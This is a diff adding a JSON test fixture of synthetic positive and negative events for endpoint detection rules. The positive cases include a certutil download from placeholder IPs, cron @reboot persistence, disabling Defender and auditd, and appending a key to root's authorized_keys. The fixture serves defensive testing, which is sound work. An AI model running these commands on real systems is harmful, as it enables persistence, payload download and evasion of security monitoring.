@@ -1,0 +1,236 @@
+{
+  "_comment": "Known-good (should_fire) and known-bad (should_not_fire) events for every behavioral rule in detections/behaviors/. Consumed by tests/test_behavior_replay.py through the same evaluator the runtime uses. All values are synthetic: RFC 5737/1918 addresses, invented hosts and users. Real vendor binary names appear only where the detection logic requires them (they are public product names, not attack content), and no entry contains a runnable attack command line. Every rule ships at least three should_not_fire cases, including deliberate near-misses that prove the filter and AND-clauses work.",
+  "auditd_stopped": {
+    "should_fire": [
+      {
+        "host": "web-01",
+        "message": "auditd: The audit daemon is stopped"
+      },
+      {
+        "host": "db-02",
+        "message": "systemd: auditd.service: disabled by administrator"
+      },
+      {
+        "host": "app-03",
+        "message": "auditd is shutting down on operator request"
+      }
+    ],
+    "should_not_fire": [
+      {
+        "host": "web-01",
+        "message": "auditd: The audit daemon is starting"
+      },
+      {
+        "host": "web-01",
+        "message": "auditd started successfully after reboot"
+      },
+      {
+        "host": "web-01",
+        "message": "auditd restarting to reload configuration"
+      },
+      {
+        "host": "web-01",
+        "message": "sshd: service stopped for maintenance"
+      },
+      {
+        "host": "web-01",
+        "message": "auditd: rotating audit logs"
+      }
+    ]
+  },
+  "certutil_remote_download": {
+    "should_fire": [
+      {
+        "command_line": "certutil -urlcache -f http://198.51.100.20/a",
+        "parent_image": "cmd.exe"
+      },
+      {
+        "command_line": "certutil.exe -verifyctl -f http://203.0.113.20/b",
+        "parent_image": "cmd.exe"
+      }
+    ],
+    "should_not_fire": [
+      {
+        "command_line": "certutil -store my",
+        "parent_image": "cmd.exe"
+      },
+      {
+        "command_line": "certutil -dump cert.cer",
+        "parent_image": "cmd.exe"
+      },
+      {
+        "command_line": "curl -o out http://198.51.100.20/a",
+        "parent_image": "cmd.exe"
+      },
+      {
+        "command_line": "certutil -hashfile payload.bin SHA256",
+        "parent_image": "cmd.exe"
+      }
+    ]
+  },
+  "cron_reboot_persistence": {
+    "should_fire": [
+      {
+        "command_line": "echo '@reboot /usr/bin/task' > /etc/cron.d/job",
+        "user": "root"
+      },
+      {
+        "command_line": "crontab -l ; echo @reboot /var/spool/cron/task",
+        "user": "svc"
+      }
+    ],
+    "should_not_fire": [
+      {
+        "command_line": "crontab -l",
+        "user": "root"
+      },
+      {
+        "command_line": "cat /etc/cron.d/existing",
+        "user": "root"
+      },
+      {
+        "command_line": "echo '@reboot task' >> /home/user/notes.txt",
+        "user": "user"
+      },
+      {
+        "command_line": "systemctl restart cron",
+        "user": "root"
+      }
+    ]
+  },
+  "memfd_fileless_execution": {
+    "should_fire": [
+      {
+        "host": "app-01",
+        "message": "type=SYSCALL syscall=memfd_create ... execveat"
+      },
+      {
+        "host": "app-02",
+        "message": "memfd_create used then exec from /proc/self/fd/3"
+      }
+    ],
+    "should_not_fire": [
+      {
+        "host": "app-01",
+        "message": "type=SYSCALL syscall=memfd_create by systemd-nspawn"
+      },
+      {
+        "host": "app-01",
+        "message": "execveat /usr/bin/python3"
+      },
+      {
+        "host": "app-01",
+        "message": "type=SYSCALL syscall=openat /proc/self/fd/1"
+      }
+    ]
+  },
+  "office_app_spawns_shell": {
+    "should_fire": [
+      {
+        "command_line": "cmd /c script",
+        "image": "C:\\Windows\\System32\\cmd.exe",
+        "parent_image": "C:\\Program Files\\Microsoft Office\\winword.exe"
+      },
+      {
+        "command_line": "powershell -enc",
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "parent_image": "C:\\Program Files\\Microsoft Office\\excel.exe"
+      },
+      {
+        "command_line": "mshta",
+        "image": "mshta.exe",
+        "parent_image": "outlook.exe"
+      }
+    ],
+    "should_not_fire": [
+      {
+        "command_line": "cmd",
+        "image": "cmd.exe",
+        "parent_image": "explorer.exe"
+      },
+      {
+        "command_line": "doc",
+        "image": "winword.exe",
+        "parent_image": "winword.exe"
+      },
+      {
+        "command_line": "svc",
+        "image": "svchost.exe",
+        "parent_image": "services.exe"
+      },
+      {
+        "command_line": "convert",
+        "image": "excelcnv.exe",
+        "parent_image": "excel.exe"
+      }
+    ]
+  },
+  "security_tool_tamper_command": {
+    "should_fire": [
+      {
+        "command_line": "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
+        "user": "svc-ops"
+      },
+      {
+        "command_line": "sc stop windefend",
+        "user": "admin"
+      },
+      {
+        "command_line": "systemctl stop auditd",
+        "user": "root"
+      },
+      {
+        "command_line": "systemctl disable auditd",
+        "user": "root"
+      }
+    ],
+    "should_not_fire": [
+      {
+        "command_line": "systemctl status auditd",
+        "user": "root"
+      },
+      {
+        "command_line": "sc query windefend",
+        "user": "admin"
+      },
+      {
+        "command_line": "systemctl start auditd",
+        "user": "root"
+      },
+      {
+        "command_line": "powershell Get-MpPreference",
+        "user": "admin"
+      }
+    ]
+  },
+  "ssh_authorized_keys_appended": {
+    "should_fire": [
+      {
+        "command_line": "echo ssh-ed25519 AAAA >> /root/.ssh/authorized_keys",
+        "user": "root"
+      },
+      {
+        "command_line": "tee -a /home/svc/.ssh/authorized_keys",
+        "user": "svc"
+      }
+    ],
+    "should_not_fire": [
+      {
+        "command_line": "cat /root/.ssh/authorized_keys",
+        "user": "root"
+      },
+      {
+        "command_line": "ls -l /root/.ssh/",
+        "user": "root"
+      },
+      {
+        "command_line": "echo hello >> /tmp/notes",
+        "user": "user"
+      },
+      {
+        "command_line": "ssh-keygen -t ed25519",
+        "user": "user"
+      }
+    ]
+  }
+}
